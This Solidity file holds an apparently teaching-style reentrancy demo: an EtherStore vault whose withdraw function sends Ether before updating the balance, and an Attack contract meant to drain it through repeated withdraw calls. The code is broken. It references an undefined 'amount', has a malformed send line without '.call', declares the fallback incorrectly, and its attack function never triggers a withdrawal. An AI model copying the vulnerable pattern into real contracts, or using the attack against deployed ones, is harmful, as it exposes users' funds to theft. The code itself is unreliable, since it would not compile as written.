// SPDX-License-Identifier: GPL-3.0
pragma solidity >=0.6.0 <0.9.0;


contract EtherStore {
    mapping (address => uint) public balances;

    function deposit() public payable{
        balances[msg.sender] += msg.value;
    }
    
    function withdraw(uint _amount) public {
        require(balances[msg.sender] >= amount);
        
        (bool sent, ) = msg.sender{value: +_amount}("");
        require(sent, "Failed to sent Ether");
        
        balances[msg.sender] -= _amount;
    }
    
    function getBalance() public view returns (uint) {
        return address(this).balance;
    } 
}

contract Attack {
    EtherStore public etherStore;

    constructor(address _etherStoreAddress) public {
        etherStore = EtherStore(_etherStoreAddress);
    }
    
    function fallback() external payable {
        if (address(etherStore).balance >= 1 ether) {
            etherStore.withdraw(1 ether);
        }
    }

    function attack() external payable{
        etherStore.deposit{value: 1 ether}();
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    } 
}
